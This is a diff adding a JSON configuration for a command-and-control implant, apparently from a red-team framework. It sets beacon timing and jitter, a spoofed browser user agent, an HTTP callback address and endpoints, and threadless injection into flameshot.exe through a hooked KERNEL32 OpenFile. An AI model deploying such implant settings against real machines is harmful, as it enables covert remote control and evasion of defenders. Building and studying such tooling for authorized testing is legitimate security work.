@@ -1,0 +1,43 @@
+{
+  "ImplantName": "desktop",
+
+  "Config": {
+    "Arch": "amd64",
+    "Debug": false,
+    "BuildType": "bin",
+    "Hostname": "LENOVO-WRKSTN-W",
+    "Sleeptime": 3,
+    "Jitter": 10
+  },
+
+  "Network": {
+    "ProfileType": "http",
+    "Domain": null,
+    "Useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
+    "Address": "192.168.0.30",
+    "Port": 80,
+
+    "Endpoints": [
+      "/endpoint1",
+      "/endpoint2",
+      "/endpoint3",
+      "/endpoint4",
+      "/endpoint5"
+    ],
+
+    "Proxy":{
+      "Enabled": false
+    }
+  },
+
+  "Injection": {
+    "Threadless": {
+
+      "ProcName": "flameshot.exe",
+      "ModuleName": "KERNEL32.DLL",
+      "FuncName": "OpenFile",
+      "LdrExecute": "C:\\Users\\lemur\\CLionProjects\\hexane-server\\src\\user\\OpenFileExecute.cpp"
+    }
+  }
+}
+
